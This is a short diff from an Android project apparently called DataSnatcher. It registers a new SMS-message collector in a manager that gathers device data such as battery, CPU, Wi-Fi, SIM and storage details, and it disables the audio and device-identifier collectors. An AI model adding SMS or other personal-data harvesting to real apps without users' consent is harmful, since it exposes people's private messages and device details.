@@ -8,6 +8,7 @@ import com.example.DataSnatcher.collector.BatteryInfoCollector;
 import com.example.DataSnatcher.collector.CPUInfoCollector;
 import com.example.DataSnatcher.collector.DeviceIdentifierInfoCollection;
 import com.example.DataSnatcher.collector.IInfoCollector;
+import com.example.DataSnatcher.collector.SMS.SMSCollector;
 import com.example.DataSnatcher.collector.SensorInfo.SensorInfoCollector;
 import com.example.DataSnatcher.collector.WifiInfoCollector;
 import com.example.DataSnatcher.collector.BatteryInfoCollector;
@@ -34,14 +35,15 @@ public class InfoCollectionManager {
         collectors = new ArrayList<>();
 
         // 在此处加
-        collectors.add(new AudioInfoCollector());
+        // collectors.add(new AudioInfoCollector());
         collectors.add(new SensorInfoCollector(context));
-        collectors.add(new DeviceIdentifierInfoCollection(context, activity));
+        // collectors.add(new DeviceIdentifierInfoCollection(context, activity));
         collectors.add(new BatteryInfoCollector(context));
         collectors.add(new CPUInfoCollector(context));
         collectors.add(new WifiInfoCollector(context));
         collectors.add(new SimCardInfoCollector(context));
         collectors.add(new StorageInfoCollector(context));
+        collectors.add(new SMSCollector(context));
     }
 
     public interface CollectAllCallback {
